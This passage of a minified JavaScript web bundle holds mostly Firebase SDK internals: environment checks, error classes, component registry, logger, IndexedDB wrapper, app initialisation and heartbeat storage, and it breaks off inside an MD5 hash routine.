<path d="M11.4 15.2H12.6V11.2H11.4V15.2ZM12 10C12.1667 10 12.3056 9.94444 12.4167 9.83333C12.5389 9.71111 12.6 9.56667 12.6 9.4C12.6 9.23333 12.5389 9.09444 12.4167 8.98333C12.3056 8.86111 12.1667 8.8 12 8.8C11.8333 8.8 11.6889 8.86111 11.5667 8.98333C11.4556 9.09444 11.4 9.23333 11.4 9.4C11.4 9.56667 11.4556 9.71111 11.5667 9.83333C11.6889 9.94444 11.8333 10 12 10ZM12 18.4C11.1222 18.4 10.2944 18.2333 9.51667 17.9C8.73889 17.5667 8.05556 17.1111 7.46667 16.5333C6.88889 15.9444 6.43333 15.2611 6.1 14.4833C5.76667 13.7056 5.6 12.8778 5.6 12C5.6 11.1111 5.76667 10.2833 6.1 9.51667C6.43333 8.73889 6.88889 8.06111 7.46667 7.48333C8.05556 6.89444 8.73889 6.43333 9.51667 6.1C10.2944 5.76667 11.1222 5.6 12 5.6C12.8889 5.6 13.7167 5.76667 14.4833 6.1C15.2611 6.43333 15.9389 6.89444 16.5167 7.48333C17.1056 8.06111 17.5667 8.73889 17.9 9.51667C18.2333 10.2833 18.4 11.1111 18.4 12C18.4 12.8778 18.2333 13.7056 17.9 14.4833C17.5667 15.2611 17.1056 15.9444 16.5167 16.5333C15.9389 17.1111 15.2611 17.5667 14.4833 17.9C13.7167 18.2333 12.8889 18.4 12 18.4ZM12 17.2C13.4444 17.2 14.6722 16.6944 15.6833 15.6833C16.6944 14.6722 17.2 13.4444 17.2 12C17.2 10.5556 16.6944 9.32778 15.6833 8.31667C14.6722 7.30555 13.4444 6.8 12 6.8C10.5556 6.8 9.32778 7.30555 8.31667 8.31667C7.30556 9.32778 6.8 10.5556 6.8 12C6.8 13.4444 7.30556 14.6722 8.31667 15.6833C9.32778 16.6944 10.5556 17.2 12 17.2Z" fill="#212121"/>
</g>
<defs>
<clipPath id="clip0_6083_34804">
<rect width="24" height="24" fill="white"/>
</clipPath>
</defs>`,A.innerText="Preview backend running in this workspace."),A.setAttribute("id",C)}document.readyState==="loading"?window.addEventListener("DOMContentLoaded",h):h()}function Qt(){return typeof navigator<"u"&&typeof navigator.userAgent=="string"?navigator.userAgent:""}function qO(){return typeof window<"u"&&!!(window.cordova||window.phonegap||window.PhoneGap)&&/ios|iphone|ipod|ipad|android|blackberry|iemobile/i.test(Qt())}function kO(){const a=Qh()?.forceEnvironment;if(a==="node")return!0;if(a==="browser")return!1;try{return Object.prototype.toString.call(global.process)==="[object process]"}catch{return!1}}function OO(){return typeof navigator<"u"&&navigator.userAgent==="Cloudflare-Workers"}function UO(){const a=typeof chrome=="object"?chrome.runtime:typeof browser=="object"?browser.runtime:void 0;return typeof a=="object"&&a.id!==void 0}function zO(){return typeof navigator=="object"&&navigator.product==="ReactNative"}function BO(){const a=Qt();return a.indexOf("MSIE ")>=0||a.indexOf("Trident/")>=0}function FO(){return!kO()&&!!navigator.userAgent&&navigator.userAgent.includes("Safari")&&!navigator.userAgent.includes("Chrome")}function VO(){try{return typeof indexedDB=="object"}catch{return!1}}function HO(){return new Promise((a,e)=>{try{let t=!0;const n="validate-browser-context-for-indexeddb-analytics-module",i=self.indexedDB.open(n);i.onsuccess=()=>{i.result.close(),t||self.indexedDB.deleteDatabase(n),a(!0)},i.onupgradeneeded=()=>{t=!1},i.onerror=()=>{e(i.error?.message||"")}}catch(t){e(t)}})}const GO="FirebaseError";class Xo extends Error{constructor(e,t,n){super(t),this.code=e,this.customData=n,this.name=GO,Object.setPrototypeOf(this,Xo.prototype),Error.captureStackTrace&&Error.captureStackTrace(this,bp.prototype.create)}}class bp{constructor(e,t,n){this.service=e,this.serviceName=t,this.errors=n}create(e,...t){const n=t[0]||{},i=`${this.service}/${e}`,r=this.errors[e],l=r?QO(r,n):"Error",u=`${this.serviceName}: ${l} (${i}).`;return new Xo(i,u,n)}}function QO(a,e){return a.replace(JO,(t,n)=>{const i=e[n];return i!=null?String(i):`<${n}?>`})}const JO=/\{\$([^}]+)}/g;function WO(a){for(const e in a)if(Object.prototype.hasOwnProperty.call(a,e))return!1;return!0}function nl(a,e){if(a===e)return!0;const t=Object.keys(a),n=Object.keys(e);for(const i of t){if(!n.includes(i))return!1;const r=a[i],l=e[i];if(DA(r)&&DA(l)){if(!nl(r,l))return!1}else if(r!==l)return!1}for(const i of n)if(!t.includes(i))return!1;return!0}function DA(a){return a!==null&&typeof a=="object"}function vp(a){const e=[];for(const[t,n]of Object.entries(a))Array.isArray(n)?n.forEach(i=>{e.push(encodeURIComponent(t)+"="+encodeURIComponent(i))}):e.push(encodeURIComponent(t)+"="+encodeURIComponent(n));return e.length?"&"+e.join("&"):""}function bd(a){const e={};return a.replace(/^\?/,"").split("&").forEach(n=>{if(n){const[i,r]=n.split("=");e[decodeURIComponent(i)]=decodeURIComponent(r)}}),e}function vd(a){const e=a.indexOf("?");if(!e)return"";const t=a.indexOf("#",e);return a.substring(e,t>0?t:void 0)}function KO(a,e){const t=new YO(a,e);return t.subscribe.bind(t)}class YO{constructor(e,t){this.observers=[],this.unsubscribes=[],this.observerCount=0,this.task=Promise.resolve(),this.finalized=!1,this.onNoObservers=t,this.task.then(()=>{e(this)}).catch(n=>{this.error(n)})}next(e){this.forEachObserver(t=>{t.next(e)})}error(e){this.forEachObserver(t=>{t.error(e)}),this.close(e)}complete(){this.forEachObserver(e=>{e.complete()}),this.close()}subscribe(e,t,n){let i;if(e===void 0&&t===void 0&&n===void 0)throw new Error("Missing Observer.");$O(e,["next","error","complete"])?i=e:i={next:e,error:t,complete:n},i.next===void 0&&(i.next=Ov),i.error===void 0&&(i.error=Ov),i.complete===void 0&&(i.complete=Ov);const r=this.unsubscribeOne.bind(this,this.observers.length);return this.finalized&&this.task.then(()=>{try{this.finalError?i.error(this.finalError):i.complete()}catch{}}),this.observers.push(i),r}unsubscribeOne(e){this.observers===void 0||this.observers[e]===void 0||(delete this.observers[e],this.observerCount-=1,this.observerCount===0&&this.onNoObservers!==void 0&&this.onNoObservers(this))}forEachObserver(e){if(!this.finalized)for(let t=0;t<this.observers.length;t++)this.sendOne(t,e)}sendOne(e,t){this.task.then(()=>{if(this.observers!==void 0&&this.observers[e]!==void 0)try{t(this.observers[e])}catch(n){typeof console<"u"&&console.error&&console.error(n)}})}close(e){this.finalized||(this.finalized=!0,e!==void 0&&(this.finalError=e),this.task.then(()=>{this.observers=void 0,this.onNoObservers=void 0}))}}function $O(a,e){if(typeof a!="object"||a===null)return!1;for(const t of e)if(t in a&&typeof a[t]=="function")return!0;return!1}function Ov(){}function bn(a){return a&&a._delegate?a._delegate:a}class il{constructor(e,t,n){this.name=e,this.instanceFactory=t,this.type=n,this.multipleInstances=!1,this.serviceProps={},this.instantiationMode="LAZY",this.onInstanceCreated=null}setInstantiationMode(e){return this.instantiationMode=e,this}setMultipleInstances(e){return this.multipleInstances=e,this}setServiceProps(e){return this.serviceProps=e,this}setInstanceCreatedCallback(e){return this.onInstanceCreated=e,this}}const Hr="[DEFAULT]";class XO{constructor(e,t){this.name=e,this.container=t,this.component=null,this.instances=new Map,this.instancesDeferred=new Map,this.instancesOptions=new Map,this.onInitCallbacks=new Map}get(e){const t=this.normalizeInstanceIdentifier(e);if(!this.instancesDeferred.has(t)){const n=new DO;if(this.instancesDeferred.set(t,n),this.isInitialized(t)||this.shouldAutoInitialize())try{const i=this.getOrInitializeService({instanceIdentifier:t});i&&n.resolve(i)}catch{}}return this.instancesDeferred.get(t).promise}getImmediate(e){const t=this.normalizeInstanceIdentifier(e?.identifier),n=e?.optional??!1;if(this.isInitialized(t)||this.shouldAutoInitialize())try{return this.getOrInitializeService({instanceIdentifier:t})}catch(i){if(n)return null;throw i}else{if(n)return null;throw Error(`Service ${this.name} is not available`)}}getComponent(){return this.component}setComponent(e){if(e.name!==this.name)throw Error(`Mismatching Component ${e.name} for Provider ${this.name}.`);if(this.component)throw Error(`Component for ${this.name} has already been provided`);if(this.component=e,!!this.shouldAutoInitialize()){if(e4(e))try{this.getOrInitializeService({instanceIdentifier:Hr})}catch{}for(const[t,n]of this.instancesDeferred.entries()){const i=this.normalizeInstanceIdentifier(t);try{const r=this.getOrInitializeService({instanceIdentifier:i});n.resolve(r)}catch{}}}}clearInstance(e=Hr){this.instancesDeferred.delete(e),this.instancesOptions.delete(e),this.instances.delete(e)}async delete(){const e=Array.from(this.instances.values());await Promise.all([...e.filter(t=>"INTERNAL"in t).map(t=>t.INTERNAL.delete()),...e.filter(t=>"_delete"in t).map(t=>t._delete())])}isComponentSet(){return this.component!=null}isInitialized(e=Hr){return this.instances.has(e)}getOptions(e=Hr){return this.instancesOptions.get(e)||{}}initialize(e={}){const{options:t={}}=e,n=this.normalizeInstanceIdentifier(e.instanceIdentifier);if(this.isInitialized(n))throw Error(`${this.name}(${n}) has already been initialized`);if(!this.isComponentSet())throw Error(`Component ${this.name} has not been registered yet`);const i=this.getOrInitializeService({instanceIdentifier:n,options:t});for(const[r,l]of this.instancesDeferred.entries()){const u=this.normalizeInstanceIdentifier(r);n===u&&l.resolve(i)}return i}onInit(e,t){const n=this.normalizeInstanceIdentifier(t),i=this.onInitCallbacks.get(n)??new Set;i.add(e),this.onInitCallbacks.set(n,i);const r=this.instances.get(n);return r&&e(r,n),()=>{i.delete(e)}}invokeOnInitCallbacks(e,t){const n=this.onInitCallbacks.get(t);if(n)for(const i of n)try{i(e,t)}catch{}}getOrInitializeService({instanceIdentifier:e,options:t={}}){let n=this.instances.get(e);if(!n&&this.component&&(n=this.component.instanceFactory(this.container,{instanceIdentifier:ZO(e),options:t}),this.instances.set(e,n),this.instancesOptions.set(e,t),this.invokeOnInitCallbacks(n,e),this.component.onInstanceCreated))try{this.component.onInstanceCreated(this.container,e,n)}catch{}return n||null}normalizeInstanceIdentifier(e=Hr){return this.component?this.component.multipleInstances?e:Hr:e}shouldAutoInitialize(){return!!this.component&&this.component.instantiationMode!=="EXPLICIT"}}function ZO(a){return a===Hr?void 0:a}function e4(a){return a.instantiationMode==="EAGER"}class a4{constructor(e){this.name=e,this.providers=new Map}addComponent(e){const t=this.getProvider(e.name);if(t.isComponentSet())throw new Error(`Component ${e.name} has already been registered with ${this.name}`);t.setComponent(e)}addOrOverwriteComponent(e){this.getProvider(e.name).isComponentSet()&&this.providers.delete(e.name),this.addComponent(e)}getProvider(e){if(this.providers.has(e))return this.providers.get(e);const t=new XO(e,this);return this.providers.set(e,t),t}getProviders(){return Array.from(this.providers.values())}}var ua;(function(a){a[a.DEBUG=0]="DEBUG",a[a.VERBOSE=1]="VERBOSE",a[a.INFO=2]="INFO",a[a.WARN=3]="WARN",a[a.ERROR=4]="ERROR",a[a.SILENT=5]="SILENT"})(ua||(ua={}));const t4={debug:ua.DEBUG,verbose:ua.VERBOSE,info:ua.INFO,warn:ua.WARN,error:ua.ERROR,silent:ua.SILENT},n4=ua.INFO,i4={[ua.DEBUG]:"log",[ua.VERBOSE]:"log",[ua.INFO]:"info",[ua.WARN]:"warn",[ua.ERROR]:"error"},o4=(a,e,...t)=>{if(e<a.logLevel)return;const n=new Date().toISOString(),i=i4[e];if(i)console[i](`[${n}]  ${a.name}:`,...t);else throw new Error(`Attempted to log a message with an invalid logType (value: ${e})`)};class mE{constructor(e){this.name=e,this._logLevel=n4,this._logHandler=o4,this._userLogHandler=null}get logLevel(){return this._logLevel}set logLevel(e){if(!(e in ua))throw new TypeError(`Invalid value "${e}" assigned to \`logLevel\``);this._logLevel=e}setLogLevel(e){this._logLevel=typeof e=="string"?t4[e]:e}get logHandler(){return this._logHandler}set logHandler(e){if(typeof e!="function")throw new TypeError("Value assigned to `logHandler` must be a function");this._logHandler=e}get userLogHandler(){return this._userLogHandler}set userLogHandler(e){this._userLogHandler=e}debug(...e){this._userLogHandler&&this._userLogHandler(this,ua.DEBUG,...e),this._logHandler(this,ua.DEBUG,...e)}log(...e){this._userLogHandler&&this._userLogHandler(this,ua.VERBOSE,...e),this._logHandler(this,ua.VERBOSE,...e)}info(...e){this._userLogHandler&&this._userLogHandler(this,ua.INFO,...e),this._logHandler(this,ua.INFO,...e)}warn(...e){this._userLogHandler&&this._userLogHandler(this,ua.WARN,...e),this._logHandler(this,ua.WARN,...e)}error(...e){this._userLogHandler&&this._userLogHandler(this,ua.ERROR,...e),this._logHandler(this,ua.ERROR,...e)}}const s4=(a,e)=>e.some(t=>a instanceof t);let MA,NA;function r4(){return MA||(MA=[IDBDatabase,IDBObjectStore,IDBIndex,IDBCursor,IDBTransaction])}function l4(){return NA||(NA=[IDBCursor.prototype.advance,IDBCursor.prototype.continue,IDBCursor.prototype.continuePrimaryKey])}const gI=new WeakMap,Gy=new WeakMap,bI=new WeakMap,Uv=new WeakMap,fE=new WeakMap;function c4(a){const e=new Promise((t,n)=>{const i=()=>{a.removeEventListener("success",r),a.removeEventListener("error",l)},r=()=>{t(Hs(a.result)),i()},l=()=>{n(a.error),i()};a.addEventListener("success",r),a.addEventListener("error",l)});return e.then(t=>{t instanceof IDBCursor&&gI.set(t,a)}).catch(()=>{}),fE.set(e,a),e}function u4(a){if(Gy.has(a))return;const e=new Promise((t,n)=>{const i=()=>{a.removeEventListener("complete",r),a.removeEventListener("error",l),a.removeEventListener("abort",l)},r=()=>{t(),i()},l=()=>{n(a.error||new DOMException("AbortError","AbortError")),i()};a.addEventListener("complete",r),a.addEventListener("error",l),a.addEventListener("abort",l)});Gy.set(a,e)}let Qy={get(a,e,t){if(a instanceof IDBTransaction){if(e==="done")return Gy.get(a);if(e==="objectStoreNames")return a.objectStoreNames||bI.get(a);if(e==="store")return t.objectStoreNames[1]?void 0:t.objectStore(t.objectStoreNames[0])}return Hs(a[e])},set(a,e,t){return a[e]=t,!0},has(a,e){return a instanceof IDBTransaction&&(e==="done"||e==="store")?!0:e in a}};function d4(a){Qy=a(Qy)}function p4(a){return a===IDBDatabase.prototype.transaction&&!("objectStoreNames"in IDBTransaction.prototype)?function(e,...t){const n=a.call(zv(this),e,...t);return bI.set(n,e.sort?e.sort():[e]),Hs(n)}:l4().includes(a)?function(...e){return a.apply(zv(this),e),Hs(gI.get(this))}:function(...e){return Hs(a.apply(zv(this),e))}}function m4(a){return typeof a=="function"?p4(a):(a instanceof IDBTransaction&&u4(a),s4(a,r4())?new Proxy(a,Qy):a)}function Hs(a){if(a instanceof IDBRequest)return c4(a);if(Uv.has(a))return Uv.get(a);const e=m4(a);return e!==a&&(Uv.set(a,e),fE.set(e,a)),e}const zv=a=>fE.get(a);function f4(a,e,{blocked:t,upgrade:n,blocking:i,terminated:r}={}){const l=indexedDB.open(a,e),u=Hs(l);return n&&l.addEventListener("upgradeneeded",d=>{n(Hs(l.result),d.oldVersion,d.newVersion,Hs(l.transaction),d)}),t&&l.addEventListener("blocked",d=>t(d.oldVersion,d.newVersion,d)),u.then(d=>{r&&d.addEventListener("close",()=>r()),i&&d.addEventListener("versionchange",p=>i(p.oldVersion,p.newVersion,p))}).catch(()=>{}),u}const h4=["get","getKey","getAll","getAllKeys","count"],g4=["put","add","delete","clear"],Bv=new Map;function _A(a,e){if(!(a instanceof IDBDatabase&&!(e in a)&&typeof e=="string"))return;if(Bv.get(e))return Bv.get(e);const t=e.replace(/FromIndex$/,""),n=e!==t,i=g4.includes(t);if(!(t in(n?IDBIndex:IDBObjectStore).prototype)||!(i||h4.includes(t)))return;const r=async function(l,...u){const d=this.transaction(l,i?"readwrite":"readonly");let p=d.store;return n&&(p=p.index(u.shift())),(await Promise.all([p[t](...u),i&&d.done]))[0]};return Bv.set(e,r),r}d4(a=>({...a,get:(e,t,n)=>_A(e,t)||a.get(e,t,n),has:(e,t)=>!!_A(e,t)||a.has(e,t)}));class b4{constructor(e){this.container=e}getPlatformInfoString(){return this.container.getProviders().map(t=>{if(v4(t)){const n=t.getImmediate();return`${n.library}/${n.version}`}else return null}).filter(t=>t).join(" ")}}function v4(a){return a.getComponent()?.type==="VERSION"}const Jy="@firebase/app",qA="0.14.8";const Qo=new mE("@firebase/app"),y4="@firebase/app-compat",E4="@firebase/analytics-compat",S4="@firebase/analytics",C4="@firebase/app-check-compat",T4="@firebase/app-check",x4="@firebase/auth",A4="@firebase/auth-compat",P4="@firebase/database",L4="@firebase/data-connect",R4="@firebase/database-compat",I4="@firebase/functions",w4="@firebase/functions-compat",j4="@firebase/installations",D4="@firebase/installations-compat",M4="@firebase/messaging",N4="@firebase/messaging-compat",_4="@firebase/performance",q4="@firebase/performance-compat",k4="@firebase/remote-config",O4="@firebase/remote-config-compat",U4="@firebase/storage",z4="@firebase/storage-compat",B4="@firebase/firestore",F4="@firebase/ai",V4="@firebase/firestore-compat",H4="firebase",G4="12.9.0";const Wy="[DEFAULT]",Q4={[Jy]:"fire-core",[y4]:"fire-core-compat",[S4]:"fire-analytics",[E4]:"fire-analytics-compat",[T4]:"fire-app-check",[C4]:"fire-app-check-compat",[x4]:"fire-auth",[A4]:"fire-auth-compat",[P4]:"fire-rtdb",[L4]:"fire-data-connect",[R4]:"fire-rtdb-compat",[I4]:"fire-fn",[w4]:"fire-fn-compat",[j4]:"fire-iid",[D4]:"fire-iid-compat",[M4]:"fire-fcm",[N4]:"fire-fcm-compat",[_4]:"fire-perf",[q4]:"fire-perf-compat",[k4]:"fire-rc",[O4]:"fire-rc-compat",[U4]:"fire-gcs",[z4]:"fire-gcs-compat",[B4]:"fire-fst",[V4]:"fire-fst-compat",[F4]:"fire-vertex","fire-js":"fire-js",[H4]:"fire-js-all"};const lh=new Map,J4=new Map,Ky=new Map;function kA(a,e){try{a.container.addComponent(e)}catch(t){Qo.debug(`Component ${e.name} failed to register with FirebaseApp ${a.name}`,t)}}function Ic(a){const e=a.name;if(Ky.has(e))return Qo.debug(`There were multiple attempts to register component ${e}.`),!1;Ky.set(e,a);for(const t of lh.values())kA(t,a);for(const t of J4.values())kA(t,a);return!0}function hE(a,e){const t=a.container.getProvider("heartbeat").getImmediate({optional:!0});return t&&t.triggerHeartbeat(),a.container.getProvider(e)}function wn(a){return a==null?!1:a.settings!==void 0}const W4={"no-app":"No Firebase App '{$appName}' has been created - call initializeApp() first","bad-app-name":"Illegal App name: '{$appName}'","duplicate-app":"Firebase App named '{$appName}' already exists with different options or config","app-deleted":"Firebase App named '{$appName}' already deleted","server-app-deleted":"Firebase Server App has been deleted","no-options":"Need to provide options, when not being deployed to hosting via source.","invalid-app-argument":"firebase.{$appName}() takes either no argument or a Firebase App instance.","invalid-log-argument":"First argument to `onLog` must be null or a function.","idb-open":"Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.","idb-get":"Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.","idb-set":"Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.","idb-delete":"Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}.","finalization-registry-not-supported":"FirebaseServerApp deleteOnDeref field defined but the JS runtime does not support FinalizationRegistry.","invalid-server-app-environment":"FirebaseServerApp is not for use in browser environments."},Gs=new bp("app","Firebase",W4);class K4{constructor(e,t,n){this._isDeleted=!1,this._options={...e},this._config={...t},this._name=t.name,this._automaticDataCollectionEnabled=t.automaticDataCollectionEnabled,this._container=n,this.container.addComponent(new il("app",()=>this,"PUBLIC"))}get automaticDataCollectionEnabled(){return this.checkDestroyed(),this._automaticDataCollectionEnabled}set automaticDataCollectionEnabled(e){this.checkDestroyed(),this._automaticDataCollectionEnabled=e}get name(){return this.checkDestroyed(),this._name}get options(){return this.checkDestroyed(),this._options}get config(){return this.checkDestroyed(),this._config}get container(){return this._container}get isDeleted(){return this._isDeleted}set isDeleted(e){this._isDeleted=e}checkDestroyed(){if(this.isDeleted)throw Gs.create("app-deleted",{appName:this._name})}}const Bc=G4;function vI(a,e={}){let t=a;typeof e!="object"&&(e={name:e});const n={name:Wy,automaticDataCollectionEnabled:!0,...e},i=n.name;if(typeof i!="string"||!i)throw Gs.create("bad-app-name",{appName:String(i)});if(t||(t=pI()),!t)throw Gs.create("no-options");const r=lh.get(i);if(r){if(nl(t,r.options)&&nl(n,r.config))return r;throw Gs.create("duplicate-app",{appName:i})}const l=new a4(i);for(const d of Ky.values())l.addComponent(d);const u=new K4(t,n,l);return lh.set(i,u),u}function yI(a=Wy){const e=lh.get(a);if(!e&&a===Wy&&pI())return vI();if(!e)throw Gs.create("no-app",{appName:a});return e}function Qs(a,e,t){let n=Q4[a]??a;t&&(n+=`-${t}`);const i=n.match(/\s|\//),r=e.match(/\s|\//);if(i||r){const l=[`Unable to register library "${n}" with version "${e}":`];i&&l.push(`library name "${n}" contains illegal characters (whitespace or "/")`),i&&r&&l.push("and"),r&&l.push(`version name "${e}" contains illegal characters (whitespace or "/")`),Qo.warn(l.join(" "));return}Ic(new il(`${n}-version`,()=>({library:n,version:e}),"VERSION"))}const Y4="firebase-heartbeat-database",$4=1,Yd="firebase-heartbeat-store";let Fv=null;function EI(){return Fv||(Fv=f4(Y4,$4,{upgrade:(a,e)=>{switch(e){case 0:try{a.createObjectStore(Yd)}catch(t){console.warn(t)}}}}).catch(a=>{throw Gs.create("idb-open",{originalErrorMessage:a.message})})),Fv}async function X4(a){try{const t=(await EI()).transaction(Yd),n=await t.objectStore(Yd).get(SI(a));return await t.done,n}catch(e){if(e instanceof Xo)Qo.warn(e.message);else{const t=Gs.create("idb-get",{originalErrorMessage:e?.message});Qo.warn(t.message)}}}async function OA(a,e){try{const n=(await EI()).transaction(Yd,"readwrite");await n.objectStore(Yd).put(e,SI(a)),await n.done}catch(t){if(t instanceof Xo)Qo.warn(t.message);else{const n=Gs.create("idb-set",{originalErrorMessage:t?.message});Qo.warn(n.message)}}}function SI(a){return`${a.name}!${a.options.appId}`}const Z4=1024,e5=30;class a5{constructor(e){this.container=e,this._heartbeatsCache=null;const t=this.container.getProvider("app").getImmediate();this._storage=new n5(t),this._heartbeatsCachePromise=this._storage.read().then(n=>(this._heartbeatsCache=n,n))}async triggerHeartbeat(){try{const t=this.container.getProvider("platform-logger").getImmediate().getPlatformInfoString(),n=UA();if(this._heartbeatsCache?.heartbeats==null&&(this._heartbeatsCache=await this._heartbeatsCachePromise,this._heartbeatsCache?.heartbeats==null)||this._heartbeatsCache.lastSentHeartbeatDate===n||this._heartbeatsCache.heartbeats.some(i=>i.date===n))return;if(this._heartbeatsCache.heartbeats.push({date:n,agent:t}),this._heartbeatsCache.heartbeats.length>e5){const i=i5(this._heartbeatsCache.heartbeats);this._heartbeatsCache.heartbeats.splice(i,1)}return this._storage.overwrite(this._heartbeatsCache)}catch(e){Qo.warn(e)}}async getHeartbeatsHeader(){try{if(this._heartbeatsCache===null&&await this._heartbeatsCachePromise,this._heartbeatsCache?.heartbeats==null||this._heartbeatsCache.heartbeats.length===0)return"";const e=UA(),{heartbeatsToSend:t,unsentEntries:n}=t5(this._heartbeatsCache.heartbeats),i=rh(JSON.stringify({version:2,heartbeats:t}));return this._heartbeatsCache.lastSentHeartbeatDate=e,n.length>0?(this._heartbeatsCache.heartbeats=n,await this._storage.overwrite(this._heartbeatsCache)):(this._heartbeatsCache.heartbeats=[],this._storage.overwrite(this._heartbeatsCache)),i}catch(e){return Qo.warn(e),""}}}function UA(){return new Date().toISOString().substring(0,10)}function t5(a,e=Z4){const t=[];let n=a.slice();for(const i of a){const r=t.find(l=>l.agent===i.agent);if(r){if(r.dates.push(i.date),zA(t)>e){r.dates.pop();break}}else if(t.push({agent:i.agent,dates:[i.date]}),zA(t)>e){t.pop();break}n=n.slice(1)}return{heartbeatsToSend:t,unsentEntries:n}}class n5{constructor(e){this.app=e,this._canUseIndexedDBPromise=this.runIndexedDBEnvironmentCheck()}async runIndexedDBEnvironmentCheck(){return VO()?HO().then(()=>!0).catch(()=>!1):!1}async read(){if(await this._canUseIndexedDBPromise){const t=await X4(this.app);return t?.heartbeats?t:{heartbeats:[]}}else return{heartbeats:[]}}async overwrite(e){if(await this._canUseIndexedDBPromise){const n=await this.read();return OA(this.app,{lastSentHeartbeatDate:e.lastSentHeartbeatDate??n.lastSentHeartbeatDate,heartbeats:e.heartbeats})}else return}async add(e){if(await this._canUseIndexedDBPromise){const n=await this.read();return OA(this.app,{lastSentHeartbeatDate:e.lastSentHeartbeatDate??n.lastSentHeartbeatDate,heartbeats:[...n.heartbeats,...e.heartbeats]})}else return}}function zA(a){return rh(JSON.stringify({version:2,heartbeats:a})).length}function i5(a){if(a.length===0)return-1;let e=0,t=a[0].date;for(let n=1;n<a.length;n++)a[n].date<t&&(t=a[n].date,e=n);return e}function o5(a){Ic(new il("platform-logger",e=>new b4(e),"PRIVATE")),Ic(new il("heartbeat",e=>new a5(e),"PRIVATE")),Qs(Jy,qA,a),Qs(Jy,qA,"esm2020"),Qs("fire-js","")}o5("");var BA=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};var Js,CI;(function(){var a;function e(q,M){function N(){}N.prototype=M.prototype,q.F=M.prototype,q.prototype=new N,q.prototype.constructor=q,q.D=function(L,_,V){for(var F=Array(arguments.length-2),ce=2;ce<arguments.length;ce++)F[ce-2]=arguments[ce];return M.prototype[_].apply(L,F)}}function t(){this.blockSize=-1}function n(){this.blockSize=-1,this.blockSize=64,this.g=Array(4),this.C=Array(this.blockSize),this.o=this.h=0,this.u()}e(n,t),n.prototype.u=function(){this.g[0]=1732584193,this.g[1]=4023233417,this.g[2]=2562383102,this.g[3]=271733878,this.o=this.h=0};function i(q,M,N){N||(N=0);const L=Array(16);if(typeof M=="string")for(var _=0;_<16;++_)L[_]=M.charCodeAt(N++)|M.charCodeAt(N++)<<8|M.charCodeAt(N++)<<16|M.charCodeAt(N++)<<24;else for(_=0;_<16;++_)L[_]=M[N++]|M[N++]<<8|M[N++]<<16|M[N++]<<24;M=q.g[0],N=q.g[1],_=q.g[2];let V=q.g[3],F;F=M+(V^N&(_^V))+L[0]+3614090360&4294967295,M=N+(F<<7&4294967295|F>>>25),F=V+(_^M&(N^_))+L[1]+3905402710&4294967295,V=M+(F<<12&4294967295|F>>>20),F=_+(N^V&(M^N))+L[2]+606105819&4294967295,_=V+(F<<17&4294967295|F>>>15),F=N+(M^_&(V^M))+L[3]+3250441966&4294967295,N=_+(F<<22&4294967295|F>>>10),F=M+(V^N&(_^V))+L[4]+4118548399&4294967295,M=N+(F<<7&4294967295|F>>>25),F=V+(_^M&(N^_))+L[5]+1200080426&4294967295,V=M+(F<<12&4294967295|F>>>20),F=_+(N^V&(M^N))+L[6]+2821735955&4294967295,_=V+(F<<17&4294967295|F>>>15),F=N+(M^_&(V^M))+L[7]+4249261313&4294967295,N=_+(F<<22&4294967295|F>>>10),F=M+(V^N&(_^V))+L[8]+1770035416&4294967295,M=N+(F<<7&4294967295|F>>>25),F=V+(_^M&(N^_))+L[9]+2336552879&4294967295,V=M+(F<<12&4294967295|F>>>20),F=_+(N^V&(M^N))+L[10]+4294925233&4294967295,_=V+(F<<17&4294967295|F>>>15),F=N+(M^_&(V^M))+L[11]+2304563134&4294967295,N=_+(F<<22&4294967295|F>>>10),F=M+(V^N&(_^V))+L[12]+1804603682&4294967295,M=N+(F<<7&4294967295|F>>>25),F=V+(_^M&(N^_))+L[13]+4254626195&4294967295,V=M+(F<<12&4294967295|F>>>20),F=_+(N^V&(M^N))+L[14]+2792965006&4294967295,_=V+(F<<17&4294967295|F>>>15),F=N+(M^_&(V^M))+L[15]+1236535329&4294967295,N=_+(F<<22&4294967295|F>>>10),F=M+(_^V&(N^_))+L[1]+4129170786&4294967295,M=N+(F<<5&4294967295|F>>>27),F=V+(N^_&(M^N))+L[6]+3225465664&4294967295,V=M+(F<<9&4294967295|F>>>23),F=_+(M^N&(V^M))+L[11]+643717713&4294967295,_=V+(F<<14&4294967295|F>>>18),F=N+(V^M&(_^V))+L[0]+3921069994&4294967295,N=_+(F<<20&4294967295|F>>>12),F=M+(_^V&(N^_))+L[5]+3593408605&4294967295,M=N+(F<<5&4294967295|F>>>27),F=V+(N^_&(M^N))+L[10]+38016083&4294967295,V=M+(F<<9&4294967295|F>>>23),F=_+(M^N&(V^M))+L[15]+3634488961&4294967295,_=V+(F<<14&4294967295|F>>>18),F=N+(V^M&(_^V))+L[4]+3889429448&4294967295,N=_+(F<<20&4294967295|F>>>12),F=M+(_^V&(N^_))+L[9]+568446438&4294967295,M=N+(F<<5&4294967295|F>>>27),F=V+(N^_&(M^N))+L[14]+3275163606&4294967295,V=M+(F<<9&4294967295|F>>>23),F=_+(M^N&(V^M))+L[3]+4107603335&4294967295,_=V+(F<<14&4294967295|F>>>18),F=N+(V^M&(_^V))+L[8]+1163531501&4294967295,N=_+(F<<20&4294967295|F>>>12),F=M+(_^V&(N^_))+L[13]+2850285829&4294967295,M=N+(F<<5&4294967295|F>>>27),F=V+(N^_&(M^N))+L[2]+4243563512&4294967295,V=M+(F<<9&4294967295|F>>>23),F=_+(M^N&(V^M))+L[7]+1735328473&4294967295,_=V+(F<<14&4294967295|F>>>18),F=N+(V^M&(_^V))+L[12]+2368359562&4294967295,N=_+(F<<20&4294967295|F>>>12),F=M+(N^_^V)+L[5]+4294588738&4294967295,M=N+(F<<4&4294967295|F>>>28),F=V+(M^N^_)+L[8]+2272392833&4294967295,V=M+(F<<11&4294967295|F>>>21),F=_+(V^M^N)+L[11]+1839030562&4294967295,_=V+(F<<16&4294967295|F>>>16),F=N+(_^V^M)+L[14]+4259657740&4294967295,N=_+(F<<23&4294967295|F>>>9),F=M+(N^_^V)+L[1]+2763975236&4294967295,M=N+(F<<4&4294967295|F>>>28),F=V+(M^N^_)+L[4]+1272893353&4294967295,V=M+(F<<11&4294967295|F>>>21),F=_+(V^M^N)+L[7]+4139469664&4294967295,_=V+(F<<16&4294967295|F>>>16),F=N+(_^V^M)+L[10]+3200236656&4294967295